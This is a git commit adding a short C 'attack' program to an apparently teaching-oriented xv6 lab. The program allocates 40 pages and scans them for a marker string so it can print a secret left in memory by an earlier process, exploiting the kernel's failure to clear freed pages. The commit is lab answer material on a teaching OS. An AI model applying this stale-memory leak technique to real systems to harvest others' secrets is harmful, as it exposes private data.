b89f8a348d40b06cf26ada9ff84250f43564183f
biabbas <bimohammadabbas@gmail.com>
2026-04-13 13:13:57 +0000

    Finish attack script

--- user/attack.c
+++ user/attack.c
@@ -6,7 +6,8 @@
 int
 main(int argc, char *argv[])
 {
-  // Your code here.
-
-  exit(1);
+  char* data=sbrk(4096*40);
+  for(int i=0;i<40;i++)
+    if(strcmp(&data[i*4096+16], "This may help."  ) == 0)
+      printf("%s\n", &data[i*4096+16*2]);
 }
